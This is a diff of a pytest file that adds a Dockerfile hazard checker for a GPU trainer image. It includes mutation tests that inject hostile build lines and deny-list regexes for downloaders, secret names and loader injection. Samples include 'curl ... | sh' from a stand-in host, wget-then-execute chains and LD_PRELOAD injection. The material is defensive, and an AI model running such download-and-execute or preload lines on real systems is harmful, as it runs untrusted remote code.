@@ -7,7 +7,14 @@ component evidence, not GPU qualification (training/gpu/README.md).
 from __future__ import annotations
 
 import json
+import os
+import platform
+import posixpath
 import re
+import shlex
+import shutil
+import subprocess
+import sys
 import tomllib
 from fnmatch import fnmatch
 from pathlib import Path
@@ -130,191 +137,530 @@ def test_is_gpu_only_catches_the_gpu_lock_contents():
     assert {"torch", "triton", "bitsandbytes", "cuda-toolkit", "nvidia-cudnn-cu13"} <= flagged
 
 
+PINNED_PYTHON = "/opt/python/bin/python3.12"
+VENV_PYTHON = "/opt/venv/bin/python"
+REQUIREMENTS = "/tmp/requirements.txt"
+# Every package-tool command the image may run, token for token. Anything else is refused.
+ALLOWED_UV_COMMANDS = (
+    ("uv", "export", "--locked", "--no-dev", "--no-emit-project", "--format", "requirements-txt")
+    + ("--python", PINNED_PYTHON, "-o", REQUIREMENTS),
+    ("uv", "venv", "/opt/venv", "--python", PINNED_PYTHON),
+    ("uv", "pip", "install", "--python", VENV_PYTHON, "--require-hashes", "--no-deps")
+    + ("--no-build", "--compile-bytecode", "-r", REQUIREMENTS),
+    ("uv", "pip", "check", "--python", VENV_PYTHON),
+)
+COMPAT_REMOVAL = ("rm", "-rf", "/usr/local/cuda/compat", "/usr/local/cuda-13.0/compat")
+COMPAT_ABSENT = ("test", "!", "-e", "/usr/local/cuda/compat")
+FINAL_LIBRARY_PATH = ("/usr/local/nvidia/lib", "/usr/local/nvidia/lib64")
+ALLOWED_KEYWORDS = {"ARG", "FROM", "COPY", "ADD", "RUN", "ENV", "WORKDIR", "USER"}
+ALLOWED_KEYWORDS |= {"ENTRYPOINT", "CMD"}
+SECRET_SUBSTRINGS = ("TOKEN", "SECRET", "PASSWORD", "PASSWD", "CREDENTIAL", "APIKEY", "PRIVATE")
+SECRET_PARTS = {"KEY", "PASS", "PAT", "AUTH", "PWD", "CREDS"}
+SHELLS = {"sh", "bash", "dash", "zsh", "ksh"}
+WRAPPERS = {"env", "sudo", "nice", "nohup", "exec", "command", "time", "timeout", "xargs"}
+PIP_TOOLS = re.compile(r"pip[0-9.]*|pipx|easy_install|conda|mamba|micromamba|poetry|pdm|hatch")
+DOWNLOADERS = re.compile(r"\b(?:curl|wget|aria2c)\b", re.I)
+SYSTEM_PACKAGERS = re.compile(
+    r"\b(?:apt|apt-get|aptitude|dpkg|add-apt-repository|apk|yum|dnf|microdnf|rpm)\b", re.I
+)
+LOADER_INJECTION = re.compile(r"\bLD_(?:PRELOAD|AUDIT)\b", re.I)
+# Raw-text backstop for installs hidden in quotes or substitutions; only one may exist.
+RAW_INSTALL = re.compile(r"\b(?:uv\s+)?pip[0-9.]*\s+(?:install|sync|download|wheel)\b", re.I)
+RAW_PIP_MODULE = re.compile(r"-m\s*(?:pip|ensurepip)\b|\buv\s+(?:sync|add|tool|run)\b", re.I)
+
+
+def is_secret_name(name: str) -> bool:
+    upper = name.upper()
+    return any(s in upper for s in SECRET_SUBSTRINGS) or bool(SECRET_PARTS & set(upper.split("_")))
+
+
+def parse_dockerfile(text: str) -> tuple[list[str], list[dict]]:
+    """Return (hazards, stages). Keywords are case-insensitive; continuations are joined and
+    comment lines inside them dropped, as BuildKit does. Each stage lists its instructions."""
+    hazards: list[str] = []
+    if re.search(r"^\s*#\s*(?:escape|syntax|check)\s*=", text, re.I | re.M):
+        hazards.append("parser_directive")
+    joined: list[str] = []
+    pending = ""
+    for line in text.splitlines():
+        if not pending and not line.strip():
+            continue
+        if line.lstrip().startswith("#"):
+            continue
+        if line.rstrip().endswith("\\"):
+            pending += line.rstrip()[:-1] + " "
+            continue
+        joined.append((pending + line).strip())
+        pending = ""
+    if pending:
+        hazards.append("dangling_continuation")
+    stages: list[dict] = [{"from": None, "steps": []}]
+    for raw in joined:
+        keyword, _, args = raw.partition(" ")
+        keyword = keyword.upper()
+        args = args.strip()
+        if keyword not in ALLOWED_KEYWORDS:
+            hazards.append("instruction_not_allowed")
+        if "<<" in args and keyword in {"RUN", "COPY", "ADD"}:
+            hazards.append("heredoc_not_allowed")
+        if keyword == "FROM":
+            stages.append({"from": args, "steps": []})
+        # Collapse whitespace left by joined continuations; quoted values are re-split later.
+        stages[-1]["steps"].append(
+            (keyword, args if keyword in {"RUN", "ENV"} else " ".join(args.split()))
+        )
+    return hazards, stages
+
+
+def env_assignments(args: str) -> list[tuple[str, str]]:
+    """ENV operands, both `NAME=value ...` and the legacy `NAME value` form; quotes removed."""
+    try:
+        tokens = shlex.split(args, posix=True)
+    except ValueError:
+        return [("__UNPARSEABLE__", args)]
+    if tokens and "=" not in tokens[0]:
+        return [(tokens[0], " ".join(tokens[1:]))]
+    return [tuple(token.split("=", 1)) for token in tokens]  # type: ignore[misc]
+
+
+def simple_commands(script: str) -> list[list[str]] | None:
+    """Split a RUN shell script into simple commands on &&, ||, ;, |, & and parentheses."""
+    lexer = shlex.shlex(script, posix=True, punctuation_chars=True)
+    lexer.whitespace_split = True
+    commands: list[list[str]] = [[]]
+    try:
+        for token in lexer:
+            if token and set(token) <= set("&|;()<>"):
+                commands.append([])
+            else:
+                commands[-1].append(token)
+    except ValueError:
+        return None
+    return [command for command in commands if command]
+
+
+def command_hazards(command: list[str], depth: int = 0) -> list[str]:
+    hazards: list[str] = []
+    index = 0
+    while index < len(command) and re.fullmatch(r"\w+=.*", command[index]):
+        index += 1  # leading VAR=value assignments
+    wrapped = False
+    while index < len(command) and Path(command[index]).name in WRAPPERS:
+        wrapped = True
+        index += 1
+        while index < len(command) and command[index].startswith("-"):
+            index += 1
+    if index >= len(command):
+        return hazards
+    tokens = tuple(command[index:])
+    program = Path(tokens[0]).name
+    if program in SHELLS and "-c" in tokens and depth < 3:
+        script = tokens[tokens.index("-c") + 1] if tokens.index("-c") + 1 < len(tokens) else ""
+        for inner in simple_commands(script) or [["__UNPARSEABLE__"]]:
+            hazards += command_hazards(inner, depth + 1)
+    elif program in SHELLS and len(tokens) > 1:
+        hazards.append("shell_runs_file")
+    elif program == "uv":
+        if wrapped or tokens not in ALLOWED_UV_COMMANDS:
+            hazards.append("package_command_not_allowed")
+    elif PIP_TOOLS.fullmatch(program):
+        hazards.append("package_command_not_allowed")
+    elif re.fullmatch(r"python[0-9.]*", program) and "-m" in tokens:
+        hazards.append("package_command_not_allowed")
+    elif tokens[0].startswith(("./", "/tmp/")):
+        hazards.append("shell_runs_file")
+    elif program == "__UNPARSEABLE__":
+        hazards.append("unparseable_run")
+    return hazards
+
+
+def image_hazards(text: str) -> list[str]:
+    hazards, stages = parse_dockerfile(text)
+    final = stages[-1]
+    all_steps = [step for stage in stages for step in stage["steps"]]
+    run_scripts = [args for keyword, args in all_steps if keyword == "RUN"]
+    run_text = "\n".join(run_scripts)
+    if DOWNLOADERS.search(run_text):
+        hazards.append("download_in_run")
+    if SYSTEM_PACKAGERS.search(run_text):
+        hazards.append("system_package_tool")
+    if len(RAW_INSTALL.findall(run_text)) != 1 or RAW_PIP_MODULE.search(run_text):
+        hazards.append("package_command_not_allowed")
+    for script in run_scripts:
+        if script.startswith("["):
+            try:
+                script = shlex.join(json.loads(script))
+            except (ValueError, TypeError):
+                hazards.append("unparseable_run")
+                continue
+        commands = simple_commands(script)
+        if commands is None:
+            hazards.append("unparseable_run")
+            continue
+        for command in commands:
+            hazards += command_hazards(command)
+    if any(LOADER_INJECTION.search(args) for _, args in all_steps):
+        hazards.append("loader_injection")
+    names = [
+        args.split("=", 1)[0].split()[0] for keyword, args in all_steps if keyword == "ARG" and args
+    ]
+    names += [
+        name for keyword, args in all_steps if keyword == "ENV" for name, _ in env_assignments(args)
+    ]
+    if any(is_secret_name(name) for name in names):
+        hazards.append("secret_like_build_variable")
+    # The final stage's own ENV is the only thing that overrides the base image's environment.
+    final_env = [
+        pair
+        for keyword, args in final["steps"]
+        if keyword == "ENV"
+        for pair in env_assignments(args)
+    ]
+    library_values = [value for name, value in final_env if name == "LD_LIBRARY_PATH"]
+    if not library_values or any("$" in value for value in library_values):
+        hazards.append("library_path_inherited")
+    for value in library_values:
+        entries = re.split(r"[:;]", value.strip("\"'"))
+        normalized = [posixpath.normpath(re.sub(r"/+", "/", entry)) for entry in entries]
+        if any(not entry or not entry.startswith("/") for entry in entries):
+            hazards.append("library_path_relative")
+        if any(
+            path.startswith("/usr/local/cuda")
+            or path == "/usr/lib/x86_64-linux-gnu"
+            or path.startswith("/usr/lib/x86_64-linux-gnu/")
+            for path in normalized
+        ):
+            hazards.append("system_cuda_on_library_path")
+        if tuple(normalized) != FINAL_LIBRARY_PATH:
+            hazards.append("library_path_not_allowlisted")
+    require = [value for name, value in final_env if name == "NVIDIA_REQUIRE_CUDA"]
+    if require != ["cuda>=13.0"] or re.search(r"NVIDIA_DISABLE_REQUIRE", text, re.I):
+        hazards.append("driver_floor_not_enforced")
+    final_commands = [
+        tuple(command)
+        for keyword, args in final["steps"]
+        if keyword == "RUN"
+        for command in simple_commands(args) or []
+    ]
+    if COMPAT_REMOVAL not in final_commands or COMPAT_ABSENT not in final_commands:
+        hazards.append("compat_libcuda_present")
+    python = json.loads((ROOT / "tools/toolchain.json").read_text())["tools"]["python"]
+    python = python["artifacts"]["Linux-x86_64"]
+    adds = [args for keyword, args in all_steps if keyword == "ADD"]
+    if adds != [f"--checksum=sha256:{python['sha256']} {python['url']} /tmp/cpython.tar.gz"]:
+        hazards.append("add_not_pinned")
+    copies = [a for keyword, a in all_steps if keyword == "COPY" and not a.startswith("--from=")]
+    if copies != ["pyproject.toml uv.lock ./"]:
+        hazards.append("copy_not_allowed")
+    froms = [stage["from"] for stage in stages[1:]]
+    if froms != ["${UV_IMAGE} AS uv", "${CUDA_BASE_IMAGE} AS build", "${CUDA_BASE_IMAGE}"]:
+        hazards.append("from_not_pinned")
+    users = [args for stage in stages for keyword, args in stage["steps"] if keyword == "USER"]
+    final_keywords = [keyword for keyword, _ in final["steps"]]
+    if (
+        users != ["10001:10001"]
+        or "USER" not in final_keywords
+        or "RUN" in final_keywords[final_keywords.index("USER") :]
+    ):
+        hazards.append("not_final_non_root_user")
+    return sorted(set(hazards))
+
+
 def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
     text = (GPU / "trainer.Dockerfile").read_text()
     toolchain = json.loads((ROOT / "tools/toolchain.json").read_text())
-    args = dict(re.findall(r"^ARG (\w+)=(\S+)$", text, re.M))
+    _, stages = parse_dockerfile(text)
+    steps = [step for stage in stages for step in stage["steps"]]
+    args = dict(a.split("=", 1) for keyword, a in steps if keyword == "ARG")
     assert DIGEST_REF.fullmatch(args["CUDA_BASE_IMAGE"])
     # The base flavour carries no cuBLAS/NCCL that could shadow the locked wheels.
     assert args["CUDA_BASE_IMAGE"].startswith("docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04@")
     assert args["UV_IMAGE"] == toolchain["bootstrap_images"]["uv"]
     assert "TODO" not in text
-    assert re.findall(r"^FROM (\S+)", text, re.M) == [
-        "${UV_IMAGE}",
-        "${CUDA_BASE_IMAGE}",
+    assert [stage["from"] for stage in stages[1:]] == [
+        "${UV_IMAGE} AS uv",
+        "${CUDA_BASE_IMAGE} AS build",
         "${CUDA_BASE_IMAGE}",
     ]
-    python = toolchain["tools"]["python"]["artifacts"]["Linux-x86_64"]
-    assert f"--checksum=sha256:{python['sha256']}" in text
-    assert python["url"] in text
-    # The only build-context inputs are the lock pair; the only download is checksum-pinned.
-    assert re.findall(r"^COPY (?!--from=)(.*)$", text, re.M) == ["pyproject.toml uv.lock ./"]
-    assert re.findall(r"^ADD (\S+)", text, re.M) == [f"--checksum=sha256:{python['sha256']}"]
-    assert "uv export --locked" in text
-    assert "--require-hashes --no-deps --no-build" in text
-    assert "uv sync" not in text and "pip install " not in text.replace("uv pip install ", "")
-    users = re.findall(r"^USER (\S+)$", text, re.M)
-    assert users == ["10001:10001"]
-    assert text.index("USER 10001:10001") > text.rindex("RUN ")
-    for offline in ("HF_HUB_OFFLINE=1", "TRANSFORMERS_OFFLINE=1", "PIP_NO_INDEX=1"):
-        assert offline in text
-    assert "OPENTOUR_GPU_QUALIFICATION=NOT_RUN" in text
+    # ADD, COPY and FROM inventories are enforced in image_hazards.
+    run_commands = [
+        tuple(command)
+        for keyword, a in steps
+        if keyword == "RUN"
+        for command in simple_commands(a) or []
+    ]
+    # Every allowed package-tool command is present exactly once, in order.
+    uv_commands = [command for command in run_commands if command[0] == "uv"]
+    assert uv_commands == list(ALLOWED_UV_COMMANDS)
+    final_env = dict(
+        pair
+        for keyword, a in stages[-1]["steps"]
+        if keyword == "ENV"
+        for pair in env_assignments(a)
+    )
+    for name in ("HF_HUB_OFFLINE", "TRANSFORMERS_OFFLINE", "PIP_NO_INDEX"):
+        assert final_env[name] == "1"
+    assert final_env["OPENTOUR_GPU_QUALIFICATION"] == "NOT_RUN"
+    assert final_env["NVIDIA_REQUIRE_CUDA"] == "cuda>=13.0"
+    assert final_env["LD_LIBRARY_PATH"] == ":".join(FINAL_LIBRARY_PATH)
     assert (GPU / ".dockerignore").read_text().splitlines() == ["**", "!pyproject.toml", "!uv.lock"]
 
 
-PINNED_PYTHON = "/opt/python/bin/python3.12"
-SECRET_NAME = re.compile(r"TOKEN|KEY|SECRET|PASSWORD|PASSWD|CREDENTIAL", re.I)
-PIPE_TO_SHELL = re.compile(r"\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:ba|da|z|k)?sh\b")
-DOWNLOAD = re.compile(r"\b(?:curl|wget)\b")
-# A shell, `source` or `.` given a file operand, or a `./file` run, after a download in one step.
-EXECUTE_FILE = re.compile(
-    r"\b(?:ba|da|z|k)?sh\s+(?!-)\S|\bsource\s+\S|(?:^|[;&|]\s*)\.\s+\S|(?:^|[\s;&|])\./\S"
-)
+def test_trainer_image_has_no_hazard():
+    assert image_hazards((GPU / "trainer.Dockerfile").read_text()) == []
 
 
-def instructions(text: str) -> list[str]:
-    """Dockerfile instructions with comments dropped and backslash continuations joined."""
-    lines = [line for line in text.splitlines() if not line.lstrip().startswith("#")]
-    return [i.strip() for i in re.sub(r"\\\n", " ", "\n".join(lines)).splitlines() if i.strip()]
+LD = "    LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64 \\\n"
+INSTALL = "      --compile-bytecode -r /tmp/requirements.txt \\\n"
+WORKDIR = "WORKDIR /home/trainer\n"
 
 
-def export_command(text: str) -> str:
-    """Only the `uv export` command, not the rest of its `&&` chain."""
-    step = next((s for s in instructions(text) if "uv export" in s), "")
-    return step[step.find("uv export") :].split("&&", 1)[0]
+def ld(value: str) -> tuple[tuple[str, str], ...]:
+    return ((LD, f"    LD_LIBRARY_PATH={value} \\\n"),)
 
 
-def image_hazards(text: str) -> list[str]:
-    hazards = []
-    steps = instructions(text)
-    if any(PIPE_TO_SHELL.search(step) for step in steps):
-        hazards.append("download_piped_to_shell")
-    for step in steps:
-        download = DOWNLOAD.search(step)
-        if download and EXECUTE_FILE.search(step, download.end()):
-            hazards.append("download_then_execute")
-            break
-    # No system package is needed; any apt-get would add an unpinned, unhashed dependency.
-    if any(re.search(r"\bapt(?:-get)?\b", step) for step in steps if step.startswith("RUN ")):
-        hazards.append("apt_get_present")
-    names = [m for s in steps if s.startswith("ARG ") for m in re.findall(r"^ARG (\w+)", s)]
-    names += [
-        m for s in steps if s.startswith("ENV ") for m in re.findall(r"(?:^ENV |\s)(\w+)=", s)
-    ]
-    # Legacy `ENV NAME value` form: the first operand carries no `=`.
-    names += [m.group(1) for s in steps if (m := re.match(r"^ENV (\w+)(?:\s|$)", s))]
-    if any(SECRET_NAME.search(name) for name in names):
-        hazards.append("secret_like_build_variable")
-    export = export_command(text)
-    uv_python = any(f"UV_PYTHON={PINNED_PYTHON}" in s for s in steps if s.startswith("ENV "))
-    if f"--python {PINNED_PYTHON}" not in export and not uv_python:
-        hazards.append("export_without_pinned_python")
-    # Both `LD_LIBRARY_PATH=value` and legacy `ENV LD_LIBRARY_PATH value`; quotes stripped.
-    values = [
-        value.strip("\"'")
-        for s in steps
-        if s.startswith("ENV ")
-        for value in re.findall(r"(?:^ENV |\s)LD_LIBRARY_PATH=(\S+)", s)
-        + re.findall(r"^ENV LD_LIBRARY_PATH\s+(\S+)", s)
-    ]
-    # `$` would inherit the base image's value, which includes /usr/local/cuda/lib64.
-    if (
-        not values
-        or any("$" in value for value in values)
-        or any(p.startswith("/usr/local/cuda") for value in values for p in value.split(":"))
-    ):
-        hazards.append("system_cuda_on_library_path")
-    return hazards
+def chain(command: str) -> tuple[tuple[str, str], ...]:
+    return ((INSTALL, INSTALL + f" && {command} \\\n"),)
 
 
-def test_trainer_image_has_no_shell_download_apt_secret_or_unpinned_interpreter():
+def before_workdir(line: str) -> tuple[tuple[str, str], ...]:
+    return ((WORKDIR, line + "\n" + WORKDIR),)
+
+
+MUTATIONS = {
+    # F1: final-stage library path and loader injection
+    "env_moved_to_build_stage": (
+        (
+            (LD, ""),
+            ("ENV UV_NO_CACHE=1", "ENV LD_LIBRARY_PATH=/usr/local/nvidia/lib\nENV UV_NO_CACHE=1"),
+        ),
+        "library_path_inherited",
+    ),
+    "library_path_missing": (((LD, ""),), "library_path_inherited"),
+    "library_path_dollar": (
+        ld("/usr/local/nvidia/lib:${LD_LIBRARY_PATH}"),
+        "library_path_inherited",
+    ),
+    "library_path_quoted_cuda": (ld('"/usr/local/cuda/lib64"'), "system_cuda_on_library_path"),
+    "library_path_versioned_cuda": (
+        ld("/usr/local/nvidia/lib:/usr/local/cuda-13.0/lib64"),
+        "system_cuda_on_library_path",
+    ),
+    "library_path_semicolon": (
+        ld("/usr/local/nvidia/lib;/usr/local/cuda/lib64"),
+        "system_cuda_on_library_path",
+    ),
+    "library_path_double_slash": (
+        ld("/usr/local/nvidia/lib://usr/local/cuda/lib64"),
+        "system_cuda_on_library_path",
+    ),
+    "library_path_dot_dot": (ld("/usr/local/nvidia/../cuda/lib64"), "system_cuda_on_library_path"),
+    "library_path_quoted_space": (
+        ld('"/opt/x y:/usr/local/cuda/lib64"'),
+        "system_cuda_on_library_path",
+    ),
+    "library_path_system_lib": (
+        ld("/usr/local/nvidia/lib:/usr/lib/x86_64-linux-gnu"),
+        "system_cuda_on_library_path",
+    ),
+    "library_path_empty_entry": (
+        ld("/usr/local/nvidia/lib::/usr/local/nvidia/lib64"),
+        "library_path_relative",
+    ),
+    "library_path_legacy_env": (
+        before_workdir("ENV LD_LIBRARY_PATH /usr/local/cuda/lib64"),
+        "system_cuda_on_library_path",
+    ),
+    "ld_preload": (((LD, LD + "    LD_PRELOAD=/opt/x/libx.so \\\n"),), "loader_injection"),
+    "ld_audit": (((LD, LD + "    LD_AUDIT=/opt/x/libx.so \\\n"),), "loader_injection"),
+    # F2: every install must be the hashed lock install
+    "extra_uv_pip_install": (
+        chain("uv pip install --python /opt/venv/bin/python requests"),
+        "package_command_not_allowed",
+    ),
+    "venv_pip3_install": (
+        chain("/opt/venv/bin/pip3 install requests"),
+        "package_command_not_allowed",
+    ),
+    "python_m_pip": (
+        chain("/opt/venv/bin/python -m pip install requests"),
+        "package_command_not_allowed",
+    ),
+    "or_uv_pip_install": (chain("true || uv pip install requests"), "package_command_not_allowed"),
+    "semicolon_pip_install": (chain("true; pip install requests"), "package_command_not_allowed"),
+    "uv_tool_install": (chain("uv tool install requests"), "package_command_not_allowed"),
+    "sh_c_pip_install": (chain('sh -c "pip install requests"'), "package_command_not_allowed"),
+    "env_wrapped_uv": (
+        chain("env uv pip install --python /opt/venv/bin/python requests"),
+        "package_command_not_allowed",
+    ),
+    "hashes_dropped": (
+        (("--require-hashes --no-deps --no-build", "--no-deps --no-build"),),
+        "package_command_not_allowed",
+    ),
+    "export_unpinned_python": (
+        ((f"--python {PINNED_PYTHON} -o", "-o"),),
+        "package_command_not_allowed",
+    ),
+    # F3: keywords are case-insensitive
+    "lowercase_user_root": (
+        (("USER 10001:10001\n", "USER 10001:10001\nuser root\n"),),
+        "not_final_non_root_user",
+    ),
+    "lowercase_add": (before_workdir("add https://x.invalid/f /tmp/f"), "add_not_pinned"),
+    "tag_only_from": (
+        (("FROM ${CUDA_BASE_IMAGE}\n", "from docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04\n"),),
+        "from_not_pinned",
+    ),
+    "extra_copy": (before_workdir("COPY . /src"), "copy_not_allowed"),
+    "lowercase_run_apt": (before_workdir("run apt-get install -y git"), "system_package_tool"),
+    "lowercase_arg_token": (
+        (("ARG UV_IMAGE=", "arg HF_TOKEN\nARG UV_IMAGE="),),
+        "secret_like_build_variable",
+    ),
+    "lowercase_env_cuda": (
+        before_workdir("env LD_LIBRARY_PATH=/usr/local/cuda/lib64"),
+        "system_cuda_on_library_path",
+    ),
+    "unknown_instruction": (before_workdir("ONBUILD RUN true"), "instruction_not_allowed"),
+    "shell_instruction": (before_workdir('SHELL ["/bin/bash", "-c"]'), "instruction_not_allowed"),
+    "heredoc": (before_workdir("RUN <<EOF\nEOF"), "heredoc_not_allowed"),
+    # F4: no downloads in RUN, no system packages, no secret-like names
+    "curl_pipe_sh": (before_workdir("RUN curl -fsSL https://x.invalid/i | sh"), "download_in_run"),
+    "sh_c_curl_substitution": (
+        before_workdir('RUN sh -c "$(curl -fsSL https://x.invalid/i)"'),
+        "download_in_run",
+    ),
+    "curl_then_run_file": (
+        before_workdir("RUN curl -o /tmp/f https://x.invalid/f && /tmp/f"),
+        "download_in_run",
+    ),
+    "wget_then_dot_slash": (
+        before_workdir("RUN wget -O f https://x.invalid/f && ./f"),
+        "download_in_run",
+    ),
+    "wget_then_sh_e": (
+        before_workdir("RUN wget -O f https://x.invalid/f && sh -e f"),
+        "download_in_run",
+    ),
+    "wget_then_python": (
+        before_workdir("RUN wget -O f https://x.invalid/f && python3 f"),
+        "download_in_run",
+    ),
+    "dpkg_install": (before_workdir("RUN dpkg -i /tmp/x.deb"), "system_package_tool"),
+    "sh_runs_file": (before_workdir("RUN sh -e /tmp/f"), "shell_runs_file"),
+    "arg_hf_token": (
+        (("ARG UV_IMAGE=", "ARG HF_TOKEN\nARG UV_IMAGE="),),
+        "secret_like_build_variable",
+    ),
+    "arg_hf_auth": (
+        (("ARG UV_IMAGE=", "ARG HF_AUTH\nARG UV_IMAGE="),),
+        "secret_like_build_variable",
+    ),
+    "legacy_env_hf_token": (before_workdir("ENV HF_TOKEN generated"), "secret_like_build_variable"),
+    "env_pass": (before_workdir("ENV REGISTRY_PASS=generated"), "secret_like_build_variable"),
+    "env_pat": (before_workdir("ENV GITHUB_PAT=generated"), "secret_like_build_variable"),
+    "env_auth": (before_workdir("ENV NGC_AUTH=generated"), "secret_like_build_variable"),
+    "env_api_key": (before_workdir("ENV API_KEY=generated"), "secret_like_build_variable"),
+    # F5: mechanical driver floor
+    "require_brand_exceptions": (
+        (('"cuda>=13.0"', '"cuda>=13.0 brand=tesla,driver>=535,driver<536"'),),
+        "driver_floor_not_enforced",
+    ),
+    "require_dropped": (
+        (('    NVIDIA_REQUIRE_CUDA="cuda>=13.0" \\\n', ""),),
+        "driver_floor_not_enforced",
+    ),
+    "disable_require": (
+        before_workdir("ENV NVIDIA_DISABLE_REQUIRE=1"),
+        "driver_floor_not_enforced",
+    ),
+    "compat_kept": (
+        (("RUN rm -rf /usr/local/cuda/compat /usr/local/cuda-13.0/compat", "RUN true"),),
+        "compat_libcuda_present",
+    ),
+}
+
+
+@pytest.mark.parametrize("name", sorted(MUTATIONS))
+def test_image_hazard_checks_reject_each_mutation(name):
+    edits, hazard = MUTATIONS[name]
     text = (GPU / "trainer.Dockerfile").read_text()
-    assert image_hazards(text) == []
-    # Both the flag and the environment pin the interpreter; either alone would suffice.
-    assert f"--python {PINNED_PYTHON}" in export_command(text)
-    assert f"UV_PYTHON={PINNED_PYTHON}" in text
+    for old, new in edits:
+        assert text.count(old) == 1, old
+        text = text.replace(old, new)
+    found = image_hazards(text)
+    assert hazard in found, found
 
 
-@pytest.mark.parametrize(
-    ("old", "new", "hazard"),
-    [
-        (
-            "RUN mkdir -p /opt/python",
-            "RUN curl -fsSL https://x.invalid/i | sh && mkdir -p /opt/python",
-            "download_piped_to_shell",
-        ),
-        (
-            "RUN mkdir -p /opt/python",
-            "RUN wget -qO- https://x.invalid/i | bash; mkdir -p /opt/python",
-            "download_piped_to_shell",
-        ),
-        (
-            "RUN groupadd",
-            "RUN apt-get update && apt-get install -y git && groupadd",
-            "apt_get_present",
-        ),
-        ("ARG UV_IMAGE=", "ARG HF_TOKEN\nARG UV_IMAGE=", "secret_like_build_variable"),
-        (
-            "WORKDIR /home/trainer",
-            "ENV HF_TOKEN generated\nWORKDIR /home/trainer",
-            "secret_like_build_variable",
-        ),
-        (
-            "RUN mkdir -p /opt/python",
-            "RUN curl -fsSL -o /tmp/i https://x.invalid/i && sh /tmp/i && mkdir -p /opt/python",
-            "download_then_execute",
-        ),
-        (
-            "RUN mkdir -p /opt/python",
-            "RUN wget -O /tmp/i https://x.invalid/i; bash /tmp/i; mkdir -p /opt/python",
-            "download_then_execute",
-        ),
-        (
-            "RUN mkdir -p /opt/python",
-            "RUN wget -O i https://x.invalid/i && chmod +x i && ./i && mkdir -p /opt/python",
-            "download_then_execute",
-        ),
-        (
-            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
-            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64:/usr/local/cuda/lib64",
-            "system_cuda_on_library_path",
-        ),
-        (
-            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
-            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:${LD_LIBRARY_PATH}",
-            "system_cuda_on_library_path",
-        ),
-        (
-            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64",
-            'LD_LIBRARY_PATH="/usr/local/cuda/lib64"',
-            "system_cuda_on_library_path",
-        ),
-        (
-            "WORKDIR /home/trainer",
-            "ENV LD_LIBRARY_PATH /usr/local/cuda/lib64\nWORKDIR /home/trainer",
-            "system_cuda_on_library_path",
-        ),
-        ("UV_LINK_MODE=copy", "UV_LINK_MODE=copy API_KEY=generated", "secret_like_build_variable"),
-        (
-            "PIP_NO_INDEX=1",
-            "PIP_NO_INDEX=1 REGISTRY_PASSWORD=generated",
-            "secret_like_build_variable",
-        ),
-    ],
-)
-def test_image_hazard_checks_reject_each_mutation(old, new, hazard):
-    text = (GPU / "trainer.Dockerfile").read_text()
-    assert text.count(old) == 1
-    assert hazard in image_hazards(text.replace(old, new))
+def gpu_references(text: str, allowed: tuple[str, ...] = ()) -> bool:
+    for permitted in allowed:
+        text = text.replace(permitted, "")
+    return GPU_REL in text
 
 
-def test_export_without_pinned_interpreter_is_rejected():
-    text = (GPU / "trainer.Dockerfile").read_text()
-    unpinned = text.replace(f"--python {PINNED_PYTHON} -o", "-o").replace(
-        f"UV_PYTHON={PINNED_PYTHON}", "UV_PYTHON_PREFERENCE=only-system"
+# The OSV scan may read the GPU lock as an input; nothing else in the CI runner may name it.
+CI_ALLOWED = ('"--lockfile=training/gpu/uv.lock"',)
+
+
+def test_justfile_and_ci_runner_never_reference_the_gpu_project():
+    assert not gpu_references((ROOT / "justfile").read_text())
+    assert not gpu_references((ROOT / "tools/ci/run.py").read_text(), CI_ALLOWED)
+    # Adverse controls for the checker itself.
+    assert gpu_references("sync:\n    uv sync --project training/gpu\n")
+    assert gpu_references('"--lockfile=training/gpu/uv.lock", "training/gpu"', CI_ALLOWED)
+    assert not gpu_references('        "--lockfile=training/gpu/uv.lock",\n', CI_ALLOWED)
+
+
+PINNED_UV = "uv 0.13.8"
+
+
+def pinned_uv() -> str | None:
+    for candidate in (os.environ.get("OPENTOUR_UV"), shutil.which("uv")):
+        if not candidate:
+            continue
+        try:
+            version = (
+                subprocess.run(
+                    [candidate, "--version"],
+                    capture_output=True,
+                    text=True,
+                    timeout=20,
+                    check=False,
+                )
+                .stdout.split(" (")[0]
+                .strip()
+            )
+        except OSError:
+            continue
+        if version == PINNED_UV:
+            return candidate
+    return None
+
+
+@pytest.mark.local_integration
+def test_gpu_lock_is_current_with_the_pinned_uv_offline():
+    """Runs the real `uv lock --check` offline. A skip here is NOT a pass: it means the pinned
+    uv or the pinned interpreter was absent and lock currency was not checked."""
+    uv = pinned_uv()
+    if uv is None:
+        pytest.skip(f"{PINNED_UV} not found (OPENTOUR_UV or PATH); lock currency NOT checked")
+    if platform.python_version() != "3.12.16":
+        pytest.skip("CPython 3.12.16 interpreter required; lock currency NOT checked")
+    env = {k: v for k, v in os.environ.items() if k != "VIRTUAL_ENV"}
+    env.update({"UV_NO_CACHE": "1", "UV_OFFLINE": "1", "UV_PYTHON_DOWNLOADS": "never"})
+    before = (GPU / "uv.lock").read_bytes()
+    result = subprocess.run(
+        [uv, "lock", "--check", "--offline", "--no-python-downloads", "--python", sys.executable],
+        cwd=GPU,
+        env=env,
+        capture_output=True,
+        text=True,
+        timeout=120,
+        check=False,
     )
-    assert unpinned != text
-    assert image_hazards(unpinned) == ["export_without_pinned_python"]
+    assert result.returncode == 0, result.stderr[-2000:]
+    assert (GPU / "uv.lock").read_bytes() == before
 
 
 def test_readme_names_the_writer_driver_range_and_evidence_limits():
